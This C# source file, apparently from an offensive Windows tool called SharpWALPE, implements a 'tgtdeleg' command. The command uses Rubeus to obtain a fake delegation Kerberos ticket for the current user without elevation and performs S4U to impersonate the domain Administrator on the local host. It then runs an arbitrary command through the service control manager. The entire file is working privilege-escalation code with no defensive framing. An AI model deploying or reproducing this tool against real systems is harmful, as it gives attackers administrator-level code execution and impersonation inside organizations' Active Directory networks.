using Mono.Options;
using System;
using System.Collections.Generic;

namespace SharpWALPE.Commands
{
    public class Tgtdeleg : Command
    {
        static string cmd_name = "tgtdeleg";
        private string lastArgs = "";
        public Tgtdeleg() : base(cmd_name, string.Format("Kerberos GSS-API -> TGT without elevation.\n- Usage: {0} {1} -h (for more detail)", Program.appName, cmd_name))
        {
            Options = new OptionSet()
            {
                "",
                string.Format("Usage: {0} {1} [OPTIONS]", Program.appName, cmd_name),
                "",
                "Options:",
                { "d=|domain", "Domain (FQDN) to authenticate to.", v => {Arg_Domain = v; lastArgs = "d"; } },
                { "s=|server", "Host name of domain controller or LDAP server.", v => {Arg_DomainController = v; lastArgs = "s"; } },
                { "c=|command", "Program to run.", v => {Arg_Command = v; lastArgs = "c"; } },
                { "help|h|?", "Show this message and exit.", v => ShowHelp = v != null },
                { "<>", v => {
                    switch (lastArgs)
                    {
                        case "c":
                            Arg_Command += " " + v;
                            break;
                    }
                } },
            };
        }

        public bool ShowHelp { get; private set; }

        public string Arg_Domain { get; private set; }
        public string Arg_DomainController { get; private set; }
        public string Arg_Command { get; private set; }

        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }

                if (string.IsNullOrEmpty(Arg_Domain))
                {
                    Arg_Domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name.ToLower();
                }

                if (string.IsNullOrEmpty(Arg_DomainController))
                {
                    Arg_DomainController = Rubeus.Networking.GetDCName();
                }

                Rubeus.Config.WrapTickets = Program.wrapTickets;
                Rubeus.Config.Show = Program.verbosity;
                //Rubeus.Config.AsnDebug = Program.verbosity;
                string targetComputerName = Environment.MachineName;
                Execute(Arg_Domain, Arg_DomainController);
                System.Threading.Thread.Sleep(1500);
                KrbSCM.Execute(Arg_Command);
                return 0;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("commands: {0}", Program.verbosity ? e.ToString() : e.Message);
                return 1;
            }
        }

        public static void Execute(string domain, string domainController)
        {
            string targetUser = $"{domain}\\Administrator";
            string targetSPN = "";
            string altService = $"HOST/{Environment.MachineName}";
            string outfile = "";
            bool ptt = true;
            bool self = true;
            string keyString = "";
            Rubeus.Interop.KERB_ETYPE encType = Rubeus.Interop.KERB_ETYPE.subkey_keymaterial;

            Console.WriteLine("[*] Action: Request Fake Delegation TGT (current user)");

            byte[] blah = Rubeus.LSA.RequestFakeDelegTicket();
            Rubeus.KRB_CRED kirbi = new Rubeus.KRB_CRED(blah);

            Rubeus.S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, null, null, null, self, false, false, keyString, encType, show: Program.verbosity);
        }
    }
}
